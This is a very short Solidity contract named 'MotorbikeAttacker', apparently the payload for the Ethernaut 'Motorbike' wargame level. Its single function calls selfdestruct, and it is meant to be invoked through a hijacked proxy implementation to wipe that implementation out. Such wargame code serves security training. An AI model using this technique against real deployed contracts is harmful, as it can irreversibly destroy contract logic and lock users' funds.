// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MotorbikeAttacker {
    function destroy() external {
        selfdestruct(payable(msg.sender));
    }
}
